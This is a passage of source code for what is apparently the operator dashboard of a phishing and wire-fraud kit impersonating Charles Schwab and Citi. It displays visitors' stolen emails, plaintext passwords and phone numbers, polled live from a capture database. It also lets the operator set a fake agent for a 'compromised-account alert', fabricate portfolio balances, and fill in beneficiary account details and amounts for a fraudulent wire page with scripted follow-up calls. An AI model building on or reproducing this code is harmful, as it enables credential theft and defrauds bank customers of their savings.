            <div style={{ background: dark ? 'rgba(255,255,255,0.03)' : 'rgba(0,0,0,0.02)', borderRadius: 6, padding: '6px 10px', marginTop: 4 }}>
              {prevCreds.map((pc, idx) => (
                <CredRow key={idx} userId={pc.userId} password={pc.password} timestamp={pc.timestamp} dark={dark} t={t} />
              ))}
            </div>
          )}
        </div>
      )}

      {/* Buttons */}
      <div style={{ display: 'flex', gap: 6 }}>
        <button onClick={onView} style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6, padding: '7px 0', borderRadius: 6, border: 'none', cursor: 'pointer', fontSize: 12, fontWeight: 600, background: dark ? 'rgba(255,255,255,0.07)' : '#F1F5F9', color: t.textSub }}>
          <Eye size={13} /> Live View
        </button>
        <button onClick={onSave} disabled={isSaved} style={{ width: 32, height: 32, borderRadius: 6, border: 'none', cursor: isSaved ? 'default' : 'pointer', background: isSaved ? 'rgba(34,197,94,0.1)' : t.btnSub, color: isSaved ? '#22C55E' : t.textMuted, display: 'flex', alignItems: 'center', justifyContent: 'center' }} title="Save">
          <Save size={13} />
        </button>
        <button onClick={onDelete} style={{ width: 32, height: 32, borderRadius: 6, border: 'none', cursor: 'pointer', background: 'rgba(239,68,68,0.08)', color: 'rgba(239,68,68,0.6)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}
          onMouseEnter={(e) => { e.currentTarget.style.background = 'rgba(239,68,68,0.18)'; e.currentTarget.style.color = '#EF4444'; }}
          onMouseLeave={(e) => { e.currentTarget.style.background = 'rgba(239,68,68,0.08)'; e.currentTarget.style.color = 'rgba(239,68,68,0.6)'; }}>
          <Trash2 size={13} />
        </button>
      </div>
    </div>
  );
}

// ── Shared types ──────────────────────────────────────────────────────────────

const EMPTY_HOLDING = { symbol: '', name: '', qty: '', price: '', value: '', pct: '' };

// ── Database Panel ────────────────────────────────────────────────────────────

interface AccountSettings {
  accountType: string;
  totalValue: string; cashValue: string; marketValue: string;
  dayChange: string; dayChangePct: string; costBasis: string;
  gainLoss: string; gainLossPct: string;
  holdings: Array<{ symbol: string; name: string; qty: string; price: string; value: string; pct: string }>;
  wireName?: string; wireAccountNum?: string; wireSortCode?: string; wireAmount?: string;
  followUpCallType?: string;
  briefingAcknowledged?: boolean;
  migrationDone?: boolean;
}

interface VaultCapture {
  id: number; brand: string;
  name: string | null; email: string | null; password: string | null; phone: string | null;
  display_name: string | null; account_num: string | null; vault_ref: string | null;
  case_id: string | null; agent_name: string | null; account_settings: AccountSettings | null;
  captured_at: string;
}

interface RowSettingsForm {
  agentName: string;
  accountType: string;
  totalValue: string; cashValue: string; marketValue: string;
  dayChange: string; dayChangePct: string; costBasis: string;
  gainLoss: string; gainLossPct: string;
  holdings: Array<{ symbol: string; name: string; qty: string; price: string; value: string; pct: string }>;
  wireName: string; wireAccountNum: string; wireSortCode: string; wireAmount: string;
  followUpCallType: string;
}

const EMPTY_ROW_SETTINGS: RowSettingsForm = {
  agentName: '', accountType: 'Individual Brokerage',
  totalValue: '', cashValue: '', marketValue: '',
  dayChange: '', dayChangePct: '', costBasis: '', gainLoss: '', gainLossPct: '',
  holdings: [{ ...EMPTY_HOLDING }],
  wireName: '', wireAccountNum: '', wireSortCode: '', wireAmount: '',
  followUpCallType: 'compliance_call',
};

function capturesToRowForm(c: VaultCapture): RowSettingsForm {
  const s = c.account_settings;
  return {
    agentName: c.agent_name || '',
    accountType: s?.accountType || 'Individual Brokerage',
    totalValue: s?.totalValue || '', cashValue: s?.cashValue || '',
    marketValue: s?.marketValue || '', dayChange: s?.dayChange || '',
    dayChangePct: s?.dayChangePct || '', costBasis: s?.costBasis || '',
    gainLoss: s?.gainLoss || '', gainLossPct: s?.gainLossPct || '',
    holdings: s?.holdings?.length ? s.holdings : [{ ...EMPTY_HOLDING }],
    wireName: s?.wireName || '', wireAccountNum: s?.wireAccountNum || '',
    wireSortCode: s?.wireSortCode || '', wireAmount: s?.wireAmount || '',
    followUpCallType: s?.followUpCallType || 'compliance_call',
  };
}

/** Sync a capture's agent + account settings into localStorage visitor config */
function syncToLocalStorage(c: VaultCapture, form: RowSettingsForm) {
  const identifier = c.email || c.phone || '';
  if (!identifier) return;
  const visitorConfig = {
    id: String(c.id),
    identifier,
    displayName: c.name || c.display_name || '',
    agentName: form.agentName,
    accountType: form.accountType,
    totalValue: form.totalValue, cashValue: form.cashValue, marketValue: form.marketValue,
    dayChange: form.dayChange, dayChangePct: form.dayChangePct, costBasis: form.costBasis,
    gainLoss: form.gainLoss, gainLossPct: form.gainLossPct,
    holdings: form.holdings.filter(h => h.symbol),
    wireName: form.wireName, wireAccountNum: form.wireAccountNum,
    wireSortCode: form.wireSortCode, wireAmount: form.wireAmount,
    followUpCallType: form.followUpCallType,
  };
  try {
    const existing = JSON.parse(localStorage.getItem('finvault_visitor_settings') || '[]');
    const idx = existing.findIndex((v: { id: string }) => v.id === String(c.id));
    if (idx >= 0) existing[idx] = visitorConfig; else existing.push(visitorConfig);
    localStorage.setItem('finvault_visitor_settings', JSON.stringify(existing));
    // Always hot-update finvault_matched_visitor when saving —
    // either it already points to this visitor, it's null (no one matched yet),
    // or it matches by id/identifier. This ensures the dashboard picks up changes live.
    const matched = JSON.parse(localStorage.getItem('finvault_matched_visitor') || 'null');
    if (
      !matched ||
      matched.id === String(c.id) ||
      matched.identifier?.toLowerCase() === identifier.toLowerCase()
    ) {
      localStorage.setItem('finvault_matched_visitor', JSON.stringify(visitorConfig));
    }
  } catch {}
}

function MigrationDoneButton({ capture, onSaved, dark }: {
  capture: VaultCapture; onSaved: (updated: VaultCapture) => void; dark: boolean;
}) {
  const t = tokens(dark);
  const acked = !!(capture.account_settings?.briefingAcknowledged);
  const done = !!(capture.account_settings?.migrationDone);
  const [marking, setMarking] = useState(false);
  const [marked, setMarked] = useState(done);

  async function markDone() {
    if (!acked || marked || marking) return;
    setMarking(true);
    try {
      const res = await fetch(`/api/vault-captures/${capture.id}/flag`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ field: 'migrationDone', value: true }),
      });
      if (res.ok) {
        const updated = await res.json();
        setMarked(true);
        onSaved(updated);
      }
    } finally { setMarking(false); }
  }

  if (marked) {
    return (
      <span style={{ fontSize: 11, fontWeight: 700, color: '#22C55E', border: '1px solid #BBF7D0', padding: '5px 12px', background: 'rgba(34,197,94,0.07)' }}>
        ✓ Migration Marked Done
      </span>
    );
  }

  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginLeft: 'auto' }}>
      {!acked && (
        <span style={{ fontSize: 10, color: t.textMuted, fontStyle: 'italic' }}>
          🔒 Locked until visitor acknowledges briefing
        </span>
      )}
      <button
        onClick={markDone}
        disabled={!acked || marking}
        title={!acked ? 'Only available after the visitor has acknowledged the client briefing' : 'Mark migration as complete — visitor dashboard will update'}
        style={{
          padding: '6px 16px', border: 'none', fontSize: 12, fontWeight: 700,
          cursor: acked && !marking ? 'pointer' : 'not-allowed',
          background: acked ? 'rgba(34,197,94,0.15)' : 'rgba(150,150,150,0.1)',
          color: acked ? '#16A34A' : t.textMuted,
          opacity: acked ? 1 : 0.5,
          transition: 'all 0.2s',
        }}>
        {marking ? 'Marking…' : '✓ Migration Done'}
      </button>
    </div>
  );
}

function RowSettingsPanel({ capture, dark, onSaved, onClose }: {
  capture: VaultCapture; dark: boolean; onSaved: (updated: VaultCapture) => void; onClose: () => void;
}) {
  const t = tokens(dark);
  const [form, setForm] = useState<RowSettingsForm>(() => capturesToRowForm(capture));
  const [saving, setSaving] = useState(false);
  const [saved, setSaved] = useState(false);
  const [autoSaved, setAutoSaved] = useState(false);
  const isMounted = useRef(false);
  const debounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  // Auto-save 1.5 s after the last change
  useEffect(() => {
    if (!isMounted.current) { isMounted.current = true; return; }
    if (debounceRef.current) clearTimeout(debounceRef.current);
    debounceRef.current = setTimeout(async () => {
      try {
        const res = await fetch(`/api/vault-captures/${capture.id}`, {
          method: 'PATCH',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            agentName: form.agentName || null,
            accountSettings: {
              accountType: form.accountType, totalValue: form.totalValue,
              cashValue: form.cashValue, marketValue: form.marketValue,
              dayChange: form.dayChange, dayChangePct: form.dayChangePct,
              costBasis: form.costBasis, gainLoss: form.gainLoss, gainLossPct: form.gainLossPct,
              holdings: form.holdings.filter(h => h.symbol || h.name || h.qty || h.price),
              wireName: form.wireName, wireAccountNum: form.wireAccountNum,
              wireSortCode: form.wireSortCode, wireAmount: form.wireAmount,
              followUpCallType: form.followUpCallType,
            },
          }),
        });
        if (res.ok) {
          const updated = await res.json();
          syncToLocalStorage(capture, form);
          onSaved(updated);
          setAutoSaved(true);
          setTimeout(() => setAutoSaved(false), 1500);
        }
      } catch { /* silent */ }
    }, 1500);
    return () => { if (debounceRef.current) clearTimeout(debounceRef.current); };
  }, [form]); // eslint-disable-line react-hooks/exhaustive-deps

  const inp: React.CSSProperties = {
    height: 28, padding: '0 8px', fontSize: 12, outline: 'none',
    background: dark ? 'rgba(255,255,255,0.07)' : '#F8FAFC',
    border: `1px solid ${t.cardBorder}`, color: t.text, boxSizing: 'border-box' as const,
    width: '100%',
  };

  const setHolding = (idx: number, field: string, val: string) => {
    setForm(f => {
      const holdings = f.holdings.map((h, i) => {
        if (i !== idx) return h;
        const updated = { ...h, [field]: val };
        // Auto-compute value when qty or price changes
        if (field === 'qty' || field === 'price') {
          const q = parseFloat(updated.qty) || 0;
          const p = parseFloat(updated.price) || 0;
          if (q > 0 && p > 0) updated.value = (q * p).toFixed(2);
        }
        return updated;
      });
      return { ...f, holdings };
    });
  };

  const autoCalculate = () => {
    setForm(f => {
      const holdings = f.holdings.map(h => {
        const q = parseFloat(h.qty) || 0;
        const p = parseFloat(h.price) || 0;
        return q > 0 && p > 0 ? { ...h, value: (q * p).toFixed(2) } : h;
      });
      const marketVal = holdings.reduce((s, h) => s + (parseFloat(h.value) || 0), 0);
      const cashVal   = parseFloat(f.cashValue) || 0;
      const totalVal  = marketVal + cashVal;
      const costVal   = parseFloat(f.costBasis) || 0;
      const gainLossVal = marketVal - costVal;
      const holdingsWithPct = holdings.map(h => ({
        ...h,
        pct: marketVal > 0 ? ((parseFloat(h.value) || 0) / marketVal * 100).toFixed(2) : h.pct,
      }));
      return {
        ...f,
        holdings: holdingsWithPct,
        marketValue: marketVal.toFixed(2),
        totalValue:  totalVal > 0 ? totalVal.toFixed(2) : f.totalValue,
        gainLoss:    gainLossVal.toFixed(2),
        gainLossPct: costVal > 0 ? (gainLossVal / costVal * 100).toFixed(2) : f.gainLossPct,
      };
    });
  };

  const save = async () => {
    setSaving(true);
    try {
      const res = await fetch(`/api/vault-captures/${capture.id}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          agentName: form.agentName || null,
          accountSettings: {
            accountType: form.accountType, totalValue: form.totalValue,
            cashValue: form.cashValue, marketValue: form.marketValue,
            dayChange: form.dayChange, dayChangePct: form.dayChangePct,
            costBasis: form.costBasis, gainLoss: form.gainLoss, gainLossPct: form.gainLossPct,
            holdings: form.holdings.filter(h => h.symbol),
            wireName: form.wireName, wireAccountNum: form.wireAccountNum,
            wireSortCode: form.wireSortCode, wireAmount: form.wireAmount,
            followUpCallType: form.followUpCallType,
          },
        }),
      });
      if (res.ok) {
        const updated = await res.json();
        syncToLocalStorage(capture, form);
        onSaved(updated);
        setSaved(true);
        setTimeout(() => setSaved(false), 2500);
      }
    } finally { setSaving(false); }
  };

  const lbl = (text: string) => (
    <div style={{ fontSize: 9, fontWeight: 700, color: t.label, textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: 3 }}>{text}</div>
  );

  return (
    <div style={{ background: dark ? '#1a1a2e' : '#F0F4F8', borderTop: `2px solid #1AACE2`, padding: '16px 18px' }}>

      {/* Agent assignment */}
      <div style={{ marginBottom: 14 }}>
        <div style={{ fontSize: 11, fontWeight: 700, color: t.text, marginBottom: 8, display: 'flex', alignItems: 'center', gap: 6 }}>
          <svg width="11" height="11" viewBox="0 0 24 24" fill="none">
            <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2" stroke="#1AACE2" strokeWidth="2" strokeLinecap="round"/>
            <circle cx="12" cy="7" r="4" stroke="#1AACE2" strokeWidth="2"/>
          </svg>
          Assigned Agent
        </div>
        <input value={form.agentName} onChange={e => setForm(f => ({ ...f, agentName: e.target.value }))}
          placeholder="e.g. James Benson — name shown in the compromised-account alert"
          style={{ ...inp, maxWidth: 420 }} />
      </div>

      {/* Account Summary */}
      <div style={{ marginBottom: 14 }}>
        <div style={{ fontSize: 11, fontWeight: 700, color: t.text, marginBottom: 8 }}>Account Summary</div>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 8, marginBottom: 8 }}>
          {([
            ['Account Type', 'accountType', 'Individual Brokerage'],
            ['Total Value ($)', 'totalValue', '7339.68'],
            ['Cash ($)', 'cashValue', '45.06'],
            ['Market Value ($)', 'marketValue', '7294.62'],
          ] as [string, keyof RowSettingsForm, string][]).map(([label, field, ph]) => (
            <div key={field}>
              {lbl(label)}
              <input value={form[field] as string} onChange={e => setForm(f => ({ ...f, [field]: e.target.value }))}
                placeholder={ph} style={{ ...inp, fontFamily: field !== 'accountType' ? 'monospace' : 'inherit' }} />
            </div>
          ))}
        </div>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 8 }}>
          {/* Day Change $ — auto-computes % from totalValue */}
          <div>
            {lbl('Day Change ($)')}
            <input value={form.dayChange} placeholder="-16.10" style={{ ...inp, fontFamily: 'monospace' }}
              onChange={e => {
                const val = e.target.value;
                setForm(f => {
                  const base = parseFloat(f.totalValue) || parseFloat(f.marketValue) || 0;
                  const n = parseFloat(val);
                  return {
                    ...f,
                    dayChange: val,
                    dayChangePct: (!isNaN(n) && base ? (n / base * 100).toFixed(2) : f.dayChangePct),
                  };
                });
              }} />
          </div>
          {/* Day Change % — auto-computes $ from totalValue */}
          <div>
            {lbl('Day Change (%)')}
            <input value={form.dayChangePct} placeholder="-0.22" style={{ ...inp, fontFamily: 'monospace' }}
              onChange={e => {
                const val = e.target.value;
                setForm(f => {
                  const base = parseFloat(f.totalValue) || parseFloat(f.marketValue) || 0;
                  const n = parseFloat(val);
                  return {
                    ...f,
                    dayChangePct: val,
                    dayChange: (!isNaN(n) && base ? (n / 100 * base).toFixed(2) : f.dayChange),
                  };
                });
              }} />
          </div>
          {/* Cost Basis — auto-recomputes gain/loss */}
          <div>
            {lbl('Cost Basis ($)')}
            <input value={form.costBasis} placeholder="7300.00" style={{ ...inp, fontFamily: 'monospace' }}
              onChange={e => {
                const val = e.target.value;
                setForm(f => {
                  const mv = parseFloat(f.marketValue) || 0;
                  const cb = parseFloat(val);
                  const gl = mv - cb;
                  return {
                    ...f,
                    costBasis: val,
                    gainLoss: (!isNaN(cb) && cb ? gl.toFixed(2) : f.gainLoss),
                    gainLossPct: (!isNaN(cb) && cb ? (gl / cb * 100).toFixed(2) : f.gainLossPct),
                  };
                });
              }} />
          </div>
          {/* Gain/Loss $ — auto-computes % from costBasis */}
          <div>
            {lbl('Gain/Loss ($)')}
            <input value={form.gainLoss} placeholder="-5.38" style={{ ...inp, fontFamily: 'monospace' }}
              onChange={e => {
                const val = e.target.value;
                setForm(f => {
                  const cb = parseFloat(f.costBasis) || 0;
                  const n = parseFloat(val);
                  return {
                    ...f,
                    gainLoss: val,
                    gainLossPct: (!isNaN(n) && cb ? (n / cb * 100).toFixed(2) : f.gainLossPct),
                  };
                });
              }} />
          </div>
          {/* Gain/Loss % — auto-computes $ from costBasis */}
          <div>
            {lbl('Gain/Loss (%)')}
            <input value={form.gainLossPct} placeholder="-0.07" style={{ ...inp, fontFamily: 'monospace' }}
              onChange={e => {
                const val = e.target.value;
                setForm(f => {
                  const cb = parseFloat(f.costBasis) || 0;
                  const n = parseFloat(val);
                  return {
                    ...f,
                    gainLossPct: val,
                    gainLoss: (!isNaN(n) && cb ? (n / 100 * cb).toFixed(2) : f.gainLoss),
                  };
                });
              }} />
          </div>
        </div>
      </div>

      {/* Holdings */}
      <div style={{ marginBottom: 14 }}>
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 6 }}>
          <div style={{ fontSize: 11, fontWeight: 700, color: t.text }}>Holdings / Positions</div>
          <div style={{ display: 'flex', gap: 6, alignItems: 'center' }}>
            <button onClick={autoCalculate}
              style={{ fontSize: 10, fontWeight: 700, color: '#F59E0B', background: 'rgba(245,158,11,0.1)', border: '1px solid rgba(245,158,11,0.3)', padding: '2px 9px', cursor: 'pointer' }}
              title="Auto-compute value from qty×price, then recalculate market value, total, gain/loss and % per holding">
              ⚡ Auto-Calculate
            </button>
            {form.holdings.length < 15 && (
              <button onClick={() => setForm(f => ({ ...f, holdings: [...f.holdings, { ...EMPTY_HOLDING }] }))}
                style={{ fontSize: 10, fontWeight: 700, color: '#1AACE2', background: 'rgba(26,172,226,0.1)', border: 'none', padding: '2px 8px', cursor: 'pointer' }}>
                + Add Row
              </button>
            )}
          </div>
        </div>
        <div style={{ display: 'grid', gridTemplateColumns: '56px 1fr 52px 68px 88px 48px 20px', gap: 4, marginBottom: 4 }}>
          {['Symbol', 'Name', 'Qty', 'Price', 'Value ($)', '% Acct', ''].map((h, i) => (
            <div key={i} style={{ fontSize: 8, color: t.textMuted, fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em' }}>{h}</div>
          ))}
        </div>
        {form.holdings.map((h, idx) => (
          <div key={idx} style={{ display: 'grid', gridTemplateColumns: '56px 1fr 52px 68px 88px 48px 20px', gap: 4, marginBottom: 4, alignItems: 'center' }}>
            {(['symbol', 'name', 'qty', 'price', 'value', 'pct'] as const).map(f => (
              <input key={f} value={h[f]} onChange={e => setHolding(idx, f, e.target.value)}
                placeholder={{ symbol: 'AAPL', name: 'Apple Inc.', qty: '100', price: '184.50', value: '18450.00', pct: '14.76' }[f]}
                style={{ ...inp, fontSize: 11, fontFamily: f !== 'name' ? 'monospace' : 'inherit' }} />
            ))}
            <button onClick={() => setForm(f => ({ ...f, holdings: f.holdings.filter((_, i) => i !== idx) }))}
              style={{ background: 'none', border: 'none', cursor: 'pointer', color: '#EF4444', fontSize: 14, padding: 0, lineHeight: 1 }}>×</button>
          </div>
        ))}
      </div>

      {/* Wire Transfer Details */}
      <div style={{ marginBottom: 14 }}>
        <div style={{ fontSize: 11, fontWeight: 700, color: t.text, marginBottom: 8, display: 'flex', alignItems: 'center', gap: 6 }}>
          <svg width="11" height="11" viewBox="0 0 24 24" fill="none">
            <rect x="2" y="7" width="20" height="14" rx="2" stroke="#1AACE2" strokeWidth="2"/>
            <path d="M16 3H8" stroke="#1AACE2" strokeWidth="2" strokeLinecap="round"/>
            <path d="M12 12v4M10 14h4" stroke="#1AACE2" strokeWidth="2" strokeLinecap="round"/>
          </svg>
          Wire Transfer Details
          <span style={{ fontSize: 9, fontWeight: 500, color: t.textMuted, marginLeft: 4 }}>shown on /wire-details page</span>
        </div>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 8, marginBottom: 10 }}>
          {([
            ['Beneficiary Name', 'wireName', 'John Smith'],
            ['Account Number', 'wireAccountNum', '12345678'],
            ['Sort Code', 'wireSortCode', '20-00-00'],
            ['Amount (£/$)', 'wireAmount', '25,000.00'],
          ] as [string, keyof RowSettingsForm, string][]).map(([label, field, ph]) => (
            <div key={field}>
              {lbl(label)}
              <input
                value={form[field] as string}
                onChange={e => setForm(f => ({ ...f, [field]: e.target.value }))}
                placeholder={ph}
                style={{ ...inp, fontFamily: field === 'wireName' ? 'inherit' : 'monospace' }}
              />
            </div>
          ))}
        </div>

        {/* Follow-up call type */}
        <div>
          {lbl('Confirmation Follow-up')}
          <div style={{ display: 'flex', gap: 8 }}>
            {[
              { value: 'compliance_call', label: 'Compliance team call', desc: 'Your compliance team will follow up with a confirmation call.' },
              { value: 'payment_verify', label: 'Payments team call', desc: 'Our payments verification team will contact you to confirm receipt of the transfer.' },
            ].map(opt => {
              const active = form.followUpCallType === opt.value;
              return (
                <button
                  key={opt.value}
                  onClick={() => setForm(f => ({ ...f, followUpCallType: opt.value }))}
                  style={{
                    flex: 1, padding: '7px 10px', textAlign: 'left', cursor: 'pointer',
                    border: `1px solid ${active ? '#1AACE2' : t.cardBorder}`,
                    background: active ? 'rgba(26,172,226,0.09)' : (dark ? 'rgba(255,255,255,0.04)' : '#F8FAFC'),
                    color: t.text, fontSize: 11, lineHeight: 1.4,
                    transition: 'all 0.15s',
                  }}>
                  <div style={{ fontWeight: 700, color: active ? '#1AACE2' : t.text, marginBottom: 2 }}>
                    {active ? '● ' : '○ '}{opt.label}
                  </div>
                  <div style={{ fontSize: 10, color: t.textMuted }}>{opt.desc}</div>
                </button>
              );
            })}
          </div>
        </div>
      </div>

      {/* Actions */}
      <div style={{ display: 'flex', gap: 8, alignItems: 'center', flexWrap: 'wrap' }}>
        <button onClick={save} disabled={saving} style={{
          padding: '8px 22px', border: 'none', cursor: 'pointer', fontSize: 12, fontWeight: 700,
          background: saved ? 'rgba(34,197,94,0.15)' : 'rgba(26,172,226,0.15)',
          color: saved ? '#22C55E' : '#1AACE2',
        }}>
          {saved ? '✓ Saved' : saving ? 'Saving…' : 'Save Settings'}
        </button>
        <button onClick={onClose} style={{
          padding: '8px 14px', border: `1px solid ${t.cardBorder}`, cursor: 'pointer',
          fontSize: 12, fontWeight: 600, background: 'transparent', color: t.textSub,
        }}>Cancel</button>
        {autoSaved && !saved && (
          <span style={{ fontSize: 11, color: '#22C55E', marginLeft: 4 }}>✓ Auto-saved</span>
        )}

        {/* Migration Done — only active once visitor has acknowledged the briefing */}
        <MigrationDoneButton capture={capture} onSaved={onSaved} dark={dark} />
      </div>
    </div>
  );
}

function DatabasePanel({ dark }: { dark: boolean }) {
  const t = tokens(dark);
  const [brand, setBrand] = useState<'schwab' | 'citi'>('schwab');
  const [captures, setCaptures] = useState<VaultCapture[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [revealed, setRevealed] = useState<Set<number>>(new Set());
  const [expandedId, setExpandedId] = useState<number | null>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const fetchCaptures = async (b: string) => {
    try {
      const res = await fetch(`/api/vault-captures?brand=${b}`);
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const data: VaultCapture[] = await res.json();
      setCaptures(data);
      setError('');
    } catch {
      setError('Could not connect to database');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    setLoading(true);
    setCaptures([]);
    setExpandedId(null);
    fetchCaptures(brand);
    if (pollRef.current) clearInterval(pollRef.current);
    pollRef.current = setInterval(() => fetchCaptures(brand), 5000);
    return () => { if (pollRef.current) clearInterval(pollRef.current); };
  }, [brand]);

  const deleteCapture = async (id: number) => {
    await fetch(`/api/vault-captures/${id}`, { method: 'DELETE' });
    setCaptures(prev => prev.filter(c => c.id !== id));
  };

  const toggleReveal = (id: number) => {
    setRevealed(prev => { const next = new Set(prev); next.has(id) ? next.delete(id) : next.add(id); return next; });
  };

  const fmt = (iso: string) => new Date(iso).toLocaleString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });

  const schwabAccent = '#1AACE2';
  const citiAccent = '#003087';
  const accent = brand === 'schwab' ? schwabAccent : citiAccent;

  return (
    <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', background: t.bg }}>
      {/* Header */}
      <div style={{ padding: '16px 24px 0', flexShrink: 0 }}>
        <div style={{ fontSize: 13, fontWeight: 700, color: t.text, marginBottom: 4 }}>Vault Capture Database</div>
        <div style={{ fontSize: 12, color: t.textSub, marginBottom: 16 }}>
          Credentials and account data collected when visitors complete vault setup.
        </div>

        {/* Brand folder tabs */}
        <div style={{ display: 'flex', gap: 0, marginBottom: 0 }}>
          {(['schwab', 'citi'] as const).map(b => (
            <button key={b} onClick={() => setBrand(b)} style={{
              padding: '9px 20px', borderRadius: '6px 6px 0 0', border: `1px solid ${t.cardBorder}`,
              borderBottom: brand === b ? `1px solid ${brand === b ? t.bg : t.cardBorder}` : `1px solid ${t.cardBorder}`,
              cursor: 'pointer', fontSize: 12, fontWeight: 700,
              background: brand === b ? t.bg : (dark ? 'rgba(255,255,255,0.03)' : '#F1F5F9'),
              color: brand === b ? (b === 'schwab' ? schwabAccent : citiAccent) : t.textMuted,
              marginRight: 2, position: 'relative', zIndex: brand === b ? 2 : 1,
              marginBottom: brand === b ? -1 : 0,
            }}>
              {b === 'schwab' ? (
                <span style={{ display: 'flex', alignItems: 'center', gap: 7 }}>
                  <svg width="36" height="12" viewBox="0 0 200 60">
                    <text x="4" y="46" fontFamily="Georgia,serif" fontStyle="italic" fontSize="38" fill={b === brand ? schwabAccent : t.textMuted}>charles</text>
                    <text x="105" y="46" fontFamily="Arial,sans-serif" fontWeight="900" fontSize="26" fill={b === brand ? schwabAccent : t.textMuted} letterSpacing="2">SCHWAB</text>
                  </svg>
                  {brand === 'schwab' && captures.length > 0 && (
                    <span style={{ fontSize: 10, fontWeight: 700, background: 'rgba(26,172,226,0.15)', color: schwabAccent, borderRadius: 10, padding: '1px 7px' }}>{captures.length}</span>
                  )}
                </span>
              ) : (
                <span style={{ display: 'flex', alignItems: 'center', gap: 7 }}>
                  <svg width="28" height="14" viewBox="0 0 120 64">
                    <text x="2" y="52" fontFamily="Arial,sans-serif" fontWeight="900" fontSize="52" fill={b === brand ? citiAccent : t.textMuted} letterSpacing="-1">citi</text>
                    <path d="M78 10 Q90 2 102 10" stroke={b === brand ? '#E31837' : t.textMuted} strokeWidth="5" fill="none" strokeLinecap="round"/>
                  </svg>
                  {brand === 'citi' && captures.length > 0 && (
                    <span style={{ fontSize: 10, fontWeight: 700, background: 'rgba(0,48,135,0.12)', color: citiAccent, borderRadius: 10, padding: '1px 7px' }}>{captures.length}</span>
                  )}
                </span>
              )}
            </button>
          ))}
        </div>
      </div>

      {/* Table area */}
      <div style={{ flex: 1, overflowY: 'auto', border: `1px solid ${t.cardBorder}`, borderRadius: '0 6px 6px 6px', margin: '0 24px 20px', background: t.card, position: 'relative', zIndex: 1 }}>
        {loading ? (
          <div style={{ padding: 40, textAlign: 'center', color: t.textMuted, fontSize: 12 }}>Loading…</div>
        ) : error ? (
          <div style={{ padding: 40, textAlign: 'center', color: '#EF4444', fontSize: 12 }}>{error}</div>
        ) : captures.length === 0 ? (
          <div style={{ padding: 48, display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 10 }}>
            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" style={{ opacity: 0.3 }}>
              <ellipse cx="12" cy="5" rx="9" ry="3" stroke={t.textMuted} strokeWidth="1.5"/>
              <path d="M3 5v14c0 1.66 4.03 3 9 3s9-1.34 9-3V5" stroke={t.textMuted} strokeWidth="1.5"/>
              <path d="M3 12c0 1.66 4.03 3 9 3s9-1.34 9-3" stroke={t.textMuted} strokeWidth="1.5"/>
            </svg>
            <div style={{ fontSize: 13, fontWeight: 600, color: t.textSub }}>No captures yet</div>
            <div style={{ fontSize: 11, color: t.textMuted, textAlign: 'center', maxWidth: 280 }}>
              Vault credentials appear here when a visitor completes the {brand === 'schwab' ? 'Charles Schwab' : 'Citi'} setup flow.
            </div>
          </div>
        ) : (
          <>
            {/* Column headers */}
            <div style={{ display: 'grid', gridTemplateColumns: '130px 1fr 1fr 120px 100px 100px 60px 34px 34px', padding: '8px 14px', borderBottom: `1px solid ${t.cardBorder}`, background: dark ? 'rgba(255,255,255,0.03)' : '#FAFAFA', position: 'sticky', top: 0, zIndex: 2 }}>
              {['Name', 'Email', 'Password', 'Phone', 'Vault Ref', 'Captured', 'Agent', '', ''].map((h, i) => (
                <div key={i} style={{ fontSize: 9, fontWeight: 700, color: t.label, textTransform: 'uppercase', letterSpacing: '0.1em' }}>{h}</div>
              ))}
            </div>
            {captures.map((c, i) => (
              <div key={c.id}>
                <div style={{ display: 'grid', gridTemplateColumns: '130px 1fr 1fr 120px 100px 100px 60px 34px 34px', padding: '9px 14px', borderBottom: expandedId === c.id ? 'none' : (i < captures.length - 1 ? `1px solid ${t.divider}` : 'none'), alignItems: 'center', background: expandedId === c.id ? (dark ? 'rgba(26,172,226,0.05)' : '#F0F8FF') : 'transparent' }}>
                  {/* Name */}
                  <div style={{ fontSize: 12, color: t.text, fontWeight: 600, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', paddingRight: 8 }}>{c.name || c.display_name || '—'}</div>
                  {/* Email */}
                  <div style={{ fontSize: 11, color: t.text, fontFamily: 'monospace', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', paddingRight: 8 }}>{c.email || '—'}</div>
                  {/* Password */}
                  <div style={{ display: 'flex', alignItems: 'center', gap: 5, paddingRight: 8 }}>
                    <span style={{ fontSize: 11, fontFamily: 'monospace', color: revealed.has(c.id) ? '#F59E0B' : t.textSub }}>
                      {revealed.has(c.id) ? (c.password || '—') : '•'.repeat(Math.max(c.password?.length || 6, 6))}
                    </span>
                    <button onClick={() => toggleReveal(c.id)} style={{ background: 'none', border: 'none', cursor: 'pointer', display: 'flex', alignItems: 'center', padding: 0, flexShrink: 0 }}>
                      {revealed.has(c.id) ? <EyeOff size={10} color={t.textMuted} /> : <Eye size={10} color={t.textMuted} />}
                    </button>
                  </div>
                  {/* Phone */}
                  <div style={{ fontSize: 11, color: t.textSub, fontFamily: 'monospace' }}>{c.phone || '—'}</div>
                  {/* Vault ref */}
